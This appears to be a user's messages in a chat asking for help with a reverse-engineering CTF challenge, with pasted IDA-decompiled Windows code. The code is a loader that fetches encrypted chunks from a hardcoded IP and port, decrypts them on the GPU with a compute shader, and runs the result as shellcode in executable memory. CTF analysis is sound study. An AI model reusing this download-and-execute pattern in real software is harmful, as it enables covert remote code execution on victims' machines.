Help me understand this ida decompiled code, for a rev ctf challenge

__int64 start()
{
  unk_14000F090 = 0;
  return sub_140001131();
}

// write access to const memory has been detected, the output may be wrong!
int64 sub_140001131()
{
  PVOID StackBase; // rbx
  signed int64 v1; // rax
  int v2; // esi
  int64 v3; // r12
  int64 v4; // rbx
  void *v5; // rax
  int64 v6; // r14
  int64 v7; // r13
  size_t v8; // rbp
  void *v9; // rax
  const void *v10; // rsi
  StackBase = NtCurrentTeb()->NtTib.StackBase;
  while ( 1 )
  {
    v1 = InterlockedCompareExchange64(&qword14000F040, (signed int64)StackBase, 0i64);
    if ( !v1 )
    {
      v2 = 0;
      goto LABEL_7;
    }
    if ( StackBase == (PVOID)v1 )
      break;
    Sleep(0x3E8u);
  }
  v2 = 1;
LABEL_7:
  if ( unk_14000F048 == 1 )
  {
    amsg_exit(31i64);
  }
  else if ( unk_14000F048 )
  {
    dword_14000F008 = 1;
  }
  else
  {
    unk_14000F048 = 1;
    initterm(&qword_140011018, qword_140011028);
  }
  if ( unk_14000F048 == 1 )
  {
    initterm(&qword_140011000, &qword_140011010);
    unk_14000F048 = 2;
  }
  if ( !v2 )
    InterlockedExchange64(&qword14000F040, 0i64);
  if ( TlsCallback_0 )
    TlsCallback_0(0i64, 2i64, 0i64);
  sub_14000426A();
  v3 = 0i64;
  qword_14000F0D0 = (int64)SetUnhandledExceptionFilter((LPTOP_LEVEL_EXCEPTION_FILTER)&loc_140004520);
  sub_140009838(nullsub_1);
  sub_1400040B0();
  v4 = dword_14000F028;
  v5 = malloc(8i64 * (dword_14000F028 + 1));
  v6 = qword_14000F020;
  v7 = (__int64)v5;
  while ( (int)v4 > (int)v3 )
  {
    v8 = strlen(*(const char )(v6 + 8 * v3)) + 1;
    v9 = malloc(v8);
    *(_QWORD *)(v7 + 8 * v3) = v9;
    v10 = *(const void )(v6 + 8 * v3++);
    qmemcpy(v9, v10, v8);
  }
  qword_14000F020 = v7;
  if ( (int)v4 < 0 )
    v4 = 0i64;
  *(_QWORD *)(v7 + 8 * v4) = 0i64;
  sub_140003F1E();
  initenv = qword14000F018;
  dword_14000F010 = sub_1400013B4((unsigned int)dword_14000F028, qword_14000F020);
  if ( !dword_14000F00C )
    exit(dword_14000F010);
  if ( !dword_14000F008 )
    cexit();
  return (unsigned int)dword_14000F010;
}

void sub_14000426A()
{
  void *v0; // rsp
  int64 i; // rbx
  int64 v2; // rax
  char v3; // [rsp+30h] [rbp-10h] BYREF
  DWORD flOldProtect[2]; // [rsp+38h] [rbp-8h] BYREF
  if ( !dword_14000F0A0 )
  {
    dword_14000F0A0 = 1;
    sub_140004974();
    v0 = alloca(sub_140004AC0());
    dword_14000F0A4 = 0;
    qword_14000F0A8 = (__int64)&v3;
    for ( i = 0i64; dword_14000F0A4 > (int)i; ++i )
    {
      v2 = qword_14000F0A8 + 40 * i;
      if ( *(_DWORD )v2 )
        VirtualProtect((LPVOID *)(v2 + 8), *(_QWORD *)(v2 + 16), *(_DWORD *)v2, flOldProtect);
    }
  }
}

int64 sub_140004974()
{
  int64 result; // rax
  int64 v1; // r8
  result = sub_140004870(off_14000BCE0);
  if ( (_DWORD)result )
    return *(unsigned int16 )((int *)(v1 + 60) + v1 + 6);
  return result;
}

*BOOL8 *_fastcall sub_140004870(int64 a1)
{
  _BOOL8 result; // rax
  int64 v2; // rcx
  result = 0i64;
  if ( *(_WORD *)a1 == 23117 )
  {
    v2 = *(int *)(a1 + 60) + a1;
    if ( *(_DWORD *)v2 == 17744 )
      return *(_WORD *)(v2 + 24) == 523;
  }
  return result;
}

void sub_1400040B0()
{
  __asm { fninit }
}

int64 sub_140003F1E()
{
  int64 result; // rax
  if ( !dword_14000F030 )
  {
    dword_14000F030 = 1;
    return sub_140003ED4();
  }
  return result;
}

int64 sub_140003ED4()
{
  int64 v0; // rdx
  int64 v1; // rcx
  int64 v2; // rax
  int64 *i; // rsi
  LODWORD(v0) = 0;
  do
  {
    v1 = (unsigned int)(v0 + 1);
    v2 = (unsigned int)v0;
    v0 = v1;
  }
  while ( qword_140009ED0[v1] );
  for ( i = &qword_140009ED0[v2]; i != qword_140009ED0; --i )
    ((void (fastcall )(int64, int64))i)(v1, v0);
  return sub_140001335(sub_140003EB0, v0);
}

Tell me the functions you need to understand more
int64 fastcall sub_1400013B4(int a1, __int64 a2)
{
  DWORD v3; // eax
  DWORD dwFlags; // eax
  DWORD v5; // eax
  DWORD v6; // eax
  DWORD LastError; // eax
  CHAR Filename[272]; // [rsp+50h] [rbp-30h] BYREF
  CHAR CommandLine[272]; // [rsp+160h] [rbp+E0h] BYREF
  char Buffer[272]; // [rsp+270h] [rbp+1F0h] BYREF
  struct _STARTUPINFOA lpStartupInfo; // [rsp+380h] [rbp+300h] BYREF
  struct _STARTUPINFOA StartupInfo; // [rsp+3F0h] [rbp+370h] BYREF
  struct PROCESSINFORMATION hHandle; // [rsp+460h] [rbp+3E0h] BYREF
  struct PROCESSINFORMATION ProcessInformation; // [rsp+480h] [rbp+400h] BYREF
  struct SECURITYATTRIBUTES PipeAttributes; // [rsp+4A0h] [rbp+420h] BYREF
  HANDLE hWritePipe; // [rsp+4C0h] [rbp+440h] BYREF
  HANDLE hReadPipe; // [rsp+4C8h] [rbp+448h] BYREF
  sub_140003F1E();
  if ( a1 <= 1 )
    goto LABEL_6;
  if ( !strcmp((const char **)(a2 + 8), "shutlock") )
  {
    sub_140001E8B();
    return 0i64;
  }
  if ( !strcmp((const char **)(a2 + 8), "ctf") )
  {
    sub_140001F40();
    return 0i64;
  }
  else
  {
LABEL_6:
    PipeAttributes.nLength = 24;
    PipeAttributes.lpSecurityDescriptor = 0i64;
    PipeAttributes.bInheritHandle = 1;
    memset(&ProcessInformation, 0, sizeof(ProcessInformation));
    memset(&hHandle, 0, sizeof(hHandle));
    memset(&StartupInfo, 0, sizeof(StartupInfo));
    StartupInfo.cb = 104;
    memset(&lpStartupInfo, 0, sizeof(lpStartupInfo));
    lpStartupInfo.cb = 104;
    if ( CreatePipe(&hReadPipe, &hWritePipe, &PipeAttributes, 0) )
    {
      GetModuleFileNameA(0i64, Filename, 0x104u);
      snprintfs(Buffer, 0x104ui64, 0x104ui64, "\"%s\" %s", Filename, "shutlock");
      snprintfs(CommandLine, 0x104ui64, 0x104ui64, "\"%s\" %s", Filename, "ctf");
      StartupInfo.hStdOutput = hWritePipe;
      dwFlags = StartupInfo.dwFlags;
      BYTE1(dwFlags) = BYTE1(StartupInfo.dwFlags) | 1;
      StartupInfo.dwFlags = dwFlags;
      if ( CreateProcessA(0i64, Buffer, 0i64, 0i64, 1, 0, 0i64, 0i64, &StartupInfo, &ProcessInformation) )
      {
        CloseHandle(hWritePipe);
        WaitForSingleObject(ProcessInformation.hProcess, 0xFFFFFFFF);
        lpStartupInfo.hStdInput = hReadPipe;
        v6 = lpStartupInfo.dwFlags;
        BYTE1(v6) = BYTE1(lpStartupInfo.dwFlags) | 1;
        lpStartupInfo.dwFlags = v6;
        if ( CreateProcessA(0i64, CommandLine, 0i64, 0i64, 1, 0, 0i64, 0i64, &lpStartupInfo, &hHandle) )
        {
          CloseHandle(hReadPipe);
          WaitForSingleObject(hHandle.hProcess, 0xFFFFFFFF);
          CloseHandle(ProcessInformation.hProcess);
          CloseHandle(ProcessInformation.hThread);
          CloseHandle(hHandle.hProcess);
          CloseHandle(hHandle.hThread);
          sub_140001360("Finished\n");
          return 0i64;
        }
        else
        {
          LastError = GetLastError();
          sub_140001360("Failed to create child2. Error: %d\n", LastError);
          return 1i64;
        }
      }
      else
      {
        v5 = GetLastError();
        sub_140001360("Failed to create child1. Error: %d\n", v5);
        return 1i64;
      }
    }
    else
    {
      v3 = GetLastError();
      sub_140001360("Failed to create pipe. Error: %d\n", v3);
      return 1i64;
    }
  }
}

unsigned int64 fastcall sub_140004AC0()
{
  unsigned int64 v0; // rax
  char *v1; // rcx
  unsigned int64 v3; // [rsp-8h] [rbp-10h]
  char v4; // [rsp+10h] [rbp+8h] BYREF
  v3 = v0;
  v1 = &v4;
  if ( v0 >= 0x1000 )
  {
    do
    {
      v1 -= 4096;
      *(_QWORD *)v1 = *(_QWORD *)v1;
      v0 -= 4096i64;
    }
    while ( v0 > 0x1000 );
  }
  *(_QWORD *)&v1[-v0] = *(_QWORD *)&v1[-v0];
  return v3;
}

void (sub_140003EB0())(void)
{
  void (result)(void); // rax
  while ( 1 )
  {
    result = (void ()(void))(off_14000A000)[0];
    if ( !(off_14000A000)[0] )
      break;
    result();
    off_14000A000 = (__int64 ()[34])((char *)off_14000A000 + 8);
  }
  return result;
}
int64 fastcall sub_140001335(int (__cdecl *a1)())
{
  return (unsigned int)-(onexit(a1) == 0i64);
}

int64 fastcall sub_1400013B4(int a1, __int64 a2)
{
  DWORD v3; // eax
  DWORD dwFlags; // eax
  DWORD v5; // eax
  DWORD v6; // eax
  DWORD LastError; // eax
  CHAR Filename[272]; // [rsp+50h] [rbp-30h] BYREF
  CHAR CommandLine[272]; // [rsp+160h] [rbp+E0h] BYREF
  char Buffer[272]; // [rsp+270h] [rbp+1F0h] BYREF
  struct _STARTUPINFOA lpStartupInfo; // [rsp+380h] [rbp+300h] BYREF
  struct _STARTUPINFOA StartupInfo; // [rsp+3F0h] [rbp+370h] BYREF
  struct PROCESSINFORMATION hHandle; // [rsp+460h] [rbp+3E0h] BYREF
  struct PROCESSINFORMATION ProcessInformation; // [rsp+480h] [rbp+400h] BYREF
  struct SECURITYATTRIBUTES PipeAttributes; // [rsp+4A0h] [rbp+420h] BYREF
  HANDLE hWritePipe; // [rsp+4C0h] [rbp+440h] BYREF
  HANDLE hReadPipe; // [rsp+4C8h] [rbp+448h] BYREF
  sub_140003F1E();
  if ( a1 <= 1 )
    goto LABEL_6;
  if ( !strcmp((const char **)(a2 + 8), "shutlock") )
  {
    sub_140001E8B();
    return 0i64;
  }
  if ( !strcmp((const char **)(a2 + 8), "ctf") )
  {
    sub_140001F40();
    return 0i64;
  }
  else
  {
LABEL_6:
    PipeAttributes.nLength = 24;
    PipeAttributes.lpSecurityDescriptor = 0i64;
    PipeAttributes.bInheritHandle = 1;
    memset(&ProcessInformation, 0, sizeof(ProcessInformation));
    memset(&hHandle, 0, sizeof(hHandle));
    memset(&StartupInfo, 0, sizeof(StartupInfo));
    StartupInfo.cb = 104;
    memset(&lpStartupInfo, 0, sizeof(lpStartupInfo));
    lpStartupInfo.cb = 104;
    if ( CreatePipe(&hReadPipe, &hWritePipe, &PipeAttributes, 0) )
    {
      GetModuleFileNameA(0i64, Filename, 0x104u);
      snprintfs(Buffer, 0x104ui64, 0x104ui64, "\"%s\" %s", Filename, "shutlock");
      snprintfs(CommandLine, 0x104ui64, 0x104ui64, "\"%s\" %s", Filename, "ctf");
      StartupInfo.hStdOutput = hWritePipe;
      dwFlags = StartupInfo.dwFlags;
      BYTE1(dwFlags) = BYTE1(StartupInfo.dwFlags) | 1;
      StartupInfo.dwFlags = dwFlags;
      if ( CreateProcessA(0i64, Buffer, 0i64, 0i64, 1, 0, 0i64, 0i64, &StartupInfo, &ProcessInformation) )
      {
        CloseHandle(hWritePipe);
        WaitForSingleObject(ProcessInformation.hProcess, 0xFFFFFFFF);
        lpStartupInfo.hStdInput = hReadPipe;
        v6 = lpStartupInfo.dwFlags;
        BYTE1(v6) = BYTE1(lpStartupInfo.dwFlags) | 1;
        lpStartupInfo.dwFlags = v6;
        if ( CreateProcessA(0i64, CommandLine, 0i64, 0i64, 1, 0, 0i64, 0i64, &lpStartupInfo, &hHandle) )
        {
          CloseHandle(hReadPipe);
          WaitForSingleObject(hHandle.hProcess, 0xFFFFFFFF);
          CloseHandle(ProcessInformation.hProcess);
          CloseHandle(ProcessInformation.hThread);
          CloseHandle(hHandle.hProcess);
          CloseHandle(hHandle.hThread);
          sub_140001360("Finished\n");
          return 0i64;
        }
        else
        {
          LastError = GetLastError();
          sub_140001360("Failed to create child2. Error: %d\n", LastError);
          return 1i64;
        }
      }
      else
      {
        v5 = GetLastError();
        sub_140001360("Failed to create child1. Error: %d\n", v5);
        return 1i64;
      }
    }
    else
    {
      v3 = GetLastError();
      sub_140001360("Failed to create pipe. Error: %d\n", v3);
      return 1i64;
    }
  }
}
__int64 sub_140001E8B()
{
  FILE *v1; // rax
  int v2; // eax
  FILE *v3; // rax
  FILE *v4; // rax
  size_t ElementCount; // [rsp+20h] [rbp-10h]
  void *Buffer; // [rsp+28h] [rbp-8h]
  Buffer = (void *)sub_140001CE5();
  if ( !Buffer )
    return 1i64;
  v1 = (FILE *)off_14000A0D0(1i64);
  v2 = _fileno(v1);
  _setmode(v2, 0x8000);
  ElementCount = (int)sub_140001ACA();
  v3 = (FILE *)off_14000A0D0(1i64);
  fwrite(Buffer, 1ui64, ElementCount, v3);
  v4 = (FILE *)off_14000A0D0(1i64);
  fflush(v4);
  free(Buffer);
  return 0i64;
}

__int64 sub_140001F40()
{
  FILE *v0; // rax
  int v1; // eax
  FILE *v3; // rax
  DWORD flOldProtect; // [rsp+34h] [rbp-2Ch] BYREF
  HANDLE hHandle; // [rsp+38h] [rbp-28h]
  BOOL v6; // [rsp+44h] [rbp-1Ch]
  void *lpAddress; // [rsp+48h] [rbp-18h]
  void *Buffer; // [rsp+50h] [rbp-10h]
  size_t Size; // [rsp+5Ch] [rbp-4h]
  flOldProtect = 0;
  v0 = (FILE *)off_14000A0D0(0i64);
  v1 = _fileno(v0);
  _setmode(v1, 0x8000);
  LODWORD(Size) = sub_140001ACA();
  if ( !(_DWORD)Size || (unsigned int)Size > 0x1000 )
    return 1i64;
  Buffer = malloc((unsigned int)Size);
  if ( !Buffer )
    return 1i64;
  v3 = (FILE *)off_14000A0D0(0i64);
  if ( fread(Buffer, 1ui64, (unsigned int)Size, v3) == (unsigned int)Size )
  {
    lpAddress = VirtualAlloc(0i64, (unsigned int)Size, 0x3000u, 4u);
    memmove(lpAddress, Buffer, (unsigned int)Size);
    v6 = VirtualProtect(lpAddress, (unsigned int)Size, 0x20u, &flOldProtect);
    hHandle = CreateThread(0i64, 0i64, (LPTHREAD_START_ROUTINE)lpAddress, 0i64, 0, 0i64);
    WaitForSingleObject(hHandle, 0xFFFFFFFF);
    return 0i64;
  }
  else
  {
    puts("stdin read error");
    free(Buffer);
    return 1i64;
  }
}

int64 sub_140001360(const char *a1, ...)
{
  int64 v1; // rax
  va_list va; // [rsp+58h] [rbp+28h] BYREF
  va_start(va, a1);
  v1 = off_14000A0D0(1i64);
  return (unsigned int)sub_140004B00(v1, a1, (__int64 *)va);
}
void *sub_140001CE5()
{
  int v1; // eax
  int v2; // eax
  __int64 Src[3]; // [rsp+20h] [rbp-30h] BYREF
  void *Block; // [rsp+38h] [rbp-18h]
  int v5; // [rsp+40h] [rbp-10h]
  int v6; // [rsp+44h] [rbp-Ch]
  int v7; // [rsp+48h] [rbp-8h]
  unsigned int i; // [rsp+4Ch] [rbp-4h]
  v6 = sub_140001ACA();
  if ( v6 <= 0 )
    return 0i64;
  v1 = v6 + 15;
  if ( v6 + 15 < 0 )
    v1 = v6 + 30;
  v5 = v1 >> 4;
  Block = malloc(v6);
  if ( !Block )
    return 0i64;
  for ( i = 0; (int)i < v5; ++i )
  {
    Src[0] = 0i64;
    Src[1] = 0i64;
    Sleep(0x927C0u);
    if ( (unsigned int)sub_1400018B1(i, Src) )
    {
      free(Block);
      return 0i64;
    }
    if ( i == v5 - 1 )
      v2 = v6 % 16;
    else
      v2 = 16;
    v7 = v2;
    if ( !v2 )
      v7 = 16;
    memcpy((char *)Block + (int)(16 * i), Src, v7);
  }
  return Block;
}

int64 sub_140001ACA()
{
  WCHAR szUrl[70]; // [rsp+30h] [rbp-50h] BYREF
  DWORD dwNumberOfBytesRead; // [rsp+BCh] [rbp+3Ch] BYREF
  int64 Buffer[12]; // [rsp+C0h] [rbp+40h] BYREF
  int v4; // [rsp+120h] [rbp+A0h]
  unsigned int v5; // [rsp+12Ch] [rbp+ACh]
  HINTERNET hFile; // [rsp+130h] [rbp+B0h]
  HINTERNET hInternet; // [rsp+138h] [rbp+B8h]
  hFile = 0i64;
  memset(Buffer, 0, sizeof(Buffer));
  v4 = 0;
  dwNumberOfBytesRead = 0;
  v5 = 0;
  hInternet = InternetOpenW(&szAgent, 1u, 0i64, 0i64, 0);
  if ( !hInternet )
    return 0xFFFFFFFFi64;
  sub_140001828(szUrl, 64i64, L"http://%ls/size", L"57.128.85.25:50002");
  hFile = InternetOpenUrlW(hInternet, szUrl, 0i64, 0, 0x2400u, 0i64);
  if ( hFile )
  {
    if ( InternetReadFile(hFile, Buffer, 0x63u, &dwNumberOfBytesRead) )
    {
      *((_BYTE *)Buffer + dwNumberOfBytesRead) = 0;
      v5 = atoi((const char *)Buffer);
      InternetCloseHandle(hFile);
      InternetCloseHandle(hInternet);
      return v5;
    }
    else
    {
      InternetCloseHandle(hFile);
      InternetCloseHandle(hInternet);
      return 0xFFFFFFFFi64;
    }
  }
  else
  {
    InternetCloseHandle(hInternet);
    return 0xFFFFFFFFi64;
  }
}
I have all the chunks, what to do with them ?

int64 fastcall sub_1400018B1(unsigned int a1, void *a2)
{
  int64 v3; // [rsp+0h] [rbp-80h] BYREF
  int64 dwFlags; // [rsp+20h] [rbp-60h]
  WCHAR szUrl[258]; // [rsp+30h] [rbp-50h] BYREF
  DWORD dwNumberOfBytesRead; // [rsp+234h] [rbp+1B4h] BYREF
  void *Src; // [rsp+238h] [rbp+1B8h]
  HINTERNET hFile; // [rsp+240h] [rbp+1C0h]
  HINTERNET hInternet; // [rsp+248h] [rbp+1C8h]
  hInternet = 0i64;
  hFile = 0i64;
  dwNumberOfBytesRead = 0;
  LODWORD(dwFlags) = a1 + 1;
  sub_140001828(&v3 + 6, 256i64, "h", L"57.128.85.25:50002", dwFlags);
  hInternet = InternetOpenW(&szAgent, 1u, 0i64, 0i64, 0);
  if ( !hInternet )
    return 1i64;
  Sleep(0x927C0u);
  hFile = InternetOpenUrlW(hInternet, szUrl, 0i64, 0, 0x2400u, 0i64);
  if ( hFile )
  {
    if ( InternetReadFile(hFile, a2, 0x10u, &dwNumberOfBytesRead) )
    {
      InternetCloseHandle(hFile);
      InternetCloseHandle(hInternet);
      Src = (void *)sub_140001872(a1, a2, dwNumberOfBytesRead);
      if ( Src )
      {
        memcpy(a2, Src, dwNumberOfBytesRead);
        free(Src);
        return 0i64;
      }
      else
      {
        return 0xFFFFFFFFi64;
      }
    }
    else
    {
      InternetCloseHandle(hFile);
      InternetCloseHandle(hInternet);
      return 1i64;
    }
  }
  else
  {
    InternetCloseHandle(hInternet);
    return 1i64;
  }
}
int64 fastcall sub_140001872(int a1, int64 a2, int64 a3) { return sub_140002353(a2, a3, (unsigned int)(-559038737 - 66 * a1)); }
void *__fastcall sub_140002353(__int64 a1, size_t a2, unsigned int a3)
{
  _QWORD *v4; // rcx
  __int64 v5; // rdx
  __int64 v6; // [rsp+58h] [rbp-28h] BYREF
  _QWORD *v7; // [rsp+60h] [rbp-20h] BYREF
  __int64 v8; // [rsp+70h] [rbp-10h]
  __int64 v9; // [rsp+78h] [rbp-8h]
  __int64 v10; // [rsp+80h] [rbp+0h] BYREF
  int v11; // [rsp+88h] [rbp+8h]
  unsigned int v12; // [rsp+8Ch] [rbp+Ch]
  int v13; // [rsp+90h] [rbp+10h]
  __int64 v14; // [rsp+A0h] [rbp+20h]
  __int64 v15; // [rsp+A8h] [rbp+28h]
  __int64 v16; // [rsp+B0h] [rbp+30h]
  __int128 v17; // [rsp+C0h] [rbp+40h]
  __int64 v18; // [rsp+D8h] [rbp+58h] BYREF
  __int64 v19; // [rsp+E0h] [rbp+60h] BYREF
  __int64 v20; // [rsp+E8h] [rbp+68h] BYREF
  ID3D11DeviceContext *ppImmediateContext; // [rsp+F0h] [rbp+70h] BYREF
  ID3D11Device *ppDevice; // [rsp+F8h] [rbp+78h] BYREF
  void *v23; // [rsp+100h] [rbp+80h]
  unsigned int v24; // [rsp+108h] [rbp+88h]
  unsigned int v25; // [rsp+10Ch] [rbp+8Ch]
  LPVOID v26; // [rsp+110h] [rbp+90h]
  HGLOBAL hResData; // [rsp+118h] [rbp+98h]
  DWORD v28; // [rsp+124h] [rbp+A4h]
  HRSRC hResInfo; // [rsp+128h] [rbp+A8h]
  unsigned int v30; // [rsp+130h] [rbp+B0h]
  unsigned int v31; // [rsp+134h] [rbp+B4h]
  HRESULT v32; // [rsp+138h] [rbp+B8h]
  int v33; // [rsp+13Ch] [rbp+BCh]
  __int64 v34; // [rsp+140h] [rbp+C0h]
  __int64 v35; // [rsp+148h] [rbp+C8h]

  ppDevice = 0i64;
  ppImmediateContext = 0i64;
  v35 = 0i64;
  v34 = 0i64;
  v20 = 0i64;
  v19 = 0i64;
  v18 = 0i64;
  v33 = a2;
  v32 = D3D11CreateDevice(0i64, D3D_DRIVER_TYPE_HARDWARE, 0i64, 0, 0i64, 0, 7u, &ppDevice, 0i64, &ppImmediateContext);
  if ( v32 < 0 )
  {
    sub_1400020D0("D3D11CreateDevice failed\n");
    return 0i64;
  }
  v17 = 0i64;
  v16 = 0i64;
  v14 = 0x200000010i64;
  v15 = 0x1000000000004i64;
  v19 = sub_140002263((_DWORD)ppDevice, 16, 4, 2, 0);
  if ( v19 )
  {
    v31 = a2;
    v30 = (a2 + 3) & 0xFFFFFFFC;
    v35 = sub_140002263((_DWORD)ppDevice, v30, 136, 0, 0);
    v34 = sub_140002263((_DWORD)ppDevice, v30, 0, 3, 1);
    if ( v35 && v34 )
    {
      ((void (__fastcall *)(ID3D11DeviceContext *, __int64, _QWORD, _QWORD, __int64, _DWORD, _DWORD))ppImmediateContext->lpVtbl->UpdateSubresource)(
        ppImmediateContext,
        v35,
        0i64,
        0i64,
        a1,
        0,
        0);
      v13 = _mm_cvtsi128_si32((__m128i)0i64);
      v10 = 0x100000000i64;
      v11 = 0;
      v12 = v30 >> 2;
      v8 = a3;
      v9 = 0i64;
      ((void (__fastcall *)(ID3D11DeviceContext *, __int64, _QWORD, __int64, _DWORD, _QWORD **))ppImmediateContext->lpVtbl->Map)(
        ppImmediateContext,
        v19,
        0i64,
        4i64,
        0,
        &v7);
      v4 = v7;
      v5 = v9;
      *v7 = v8;
      v4[1] = v5;
      ((void (__fastcall *)(ID3D11DeviceContext *, __int64, _QWORD))ppImmediateContext->lpVtbl->Unmap)(
        ppImmediateContext,
        v19,
        0i64);
      ((void (__fastcall *)(ID3D11DeviceContext *, _QWORD, __int64, __int64 *))ppImmediateContext->lpVtbl->CSSetConstantBuffers)(
        ppImmediateContext,
        0i64,
        1i64,
        &v19);
      v32 = ((__int64 (__fastcall *)(ID3D11Device *, __int64, __int64 *, __int64 *))ppDevice->lpVtbl->CreateUnorderedAccessView)(
              ppDevice,
              v35,
              &v10,
              &v20);
      if ( v32 >= 0 )
      {
        hResInfo = FindResourceA(0i64, (LPCSTR)0x65, (LPCSTR)0xA);
        if ( hResInfo )
        {
          v28 = SizeofResource(0i64, hResInfo);
          hResData = LoadResource(0i64, hResInfo);
          if ( hResData )
          {
            v26 = LockResource(hResData);
            v32 = ((__int64 (__fastcall *)(ID3D11Device *, LPVOID, _QWORD, _QWORD, __int64 *))ppDevice->lpVtbl->CreateComputeShader)(
                    ppDevice,
                    v26,
                    v28,
                    0i64,
                    &v18);
            if ( v32 >= 0 )
            {
              ((void (__fastcall *)(ID3D11DeviceContext *, _QWORD, __int64, __int64 *, _QWORD))ppImmediateContext->lpVtbl->CSSetUnorderedAccessViews)(
                ppImmediateContext,
                0i64,
                1i64,
                &v20,
                0i64);
              ((void (__fastcall *)(ID3D11DeviceContext *, __int64, _QWORD, _QWORD))ppImmediateContext->lpVtbl->CSSetShader)(
                ppImmediateContext,
                v18,
                0i64,
                0i64);
              v25 = (unsigned int)(v33 + 3) >> 2;
              v24 = (v25 + 255) >> 8;
              ((void (__fastcall *)(ID3D11DeviceContext *, _QWORD, __int64, __int64))ppImmediateContext->lpVtbl->Dispatch)(
                ppImmediateContext,
                v24,
                1i64,
                1i64);
              v6 = 0i64;
              ((void (__fastcall *)(ID3D11DeviceContext *, _QWORD, __int64, __int64 *, _QWORD))ppImmediateContext->lpVtbl->CSSetUnorderedAccessViews)(
                ppImmediateContext,
                0i64,
                1i64,
                &v6,
                0i64);
              ((void (__fastcall *)(ID3D11DeviceContext *, _QWORD, _QWORD, _QWORD))ppImmediateContext->lpVtbl->CSSetShader)(
                ppImmediateContext,
                0i64,
                0i64,
                0i64);
              v23 = malloc(a2);
              if ( (unsigned int)sub_140002182((_DWORD)ppImmediateContext, v35, v34, (_DWORD)v23, v31) )
                return v23;
            }
            else
            {
              puts("CreateComputeShader failed");
            }
          }
          else
          {
            puts("LoadResource failed");
          }
        }
        else
        {
          puts("FindResource failed");
        }
      }
      else
      {
        sub_1400020D0("CreateUAV failed\n");
      }
    }
    else
    {
      sub_1400020D0("buffer creation failed\n");
    }
  }
  else
  {
    puts("Create constant buffer failed");
  }
  if ( v20 )
    (*(void (__fastcall **)(__int64))(*(_QWORD *)v20 + 16i64))(v20);
  if ( v18 )
    (*(void (__fastcall **)(__int64))(*(_QWORD *)v18 + 16i64))(v18);
  if ( v35 )
    (*(void (__fastcall **)(__int64))(*(_QWORD *)v35 + 16i64))(v35);
  if ( v34 )
    (*(void (__fastcall **)(__int64))(*(_QWORD *)v34 + 16i64))(v34);
  if ( ppImmediateContext )
    ((void (__fastcall *)(ID3D11DeviceContext *))ppImmediateContext->lpVtbl->Release)(ppImmediateContext);
  if ( ppDevice )
    ((void (__fastcall *)(ID3D11Device *))ppDevice->lpVtbl->Release)(ppDevice);
  if ( v19 )
    (*(void (__fastcall **)(__int64))(*(_QWORD *)v19 + 16i64))(v19);
  return 0i64;
}
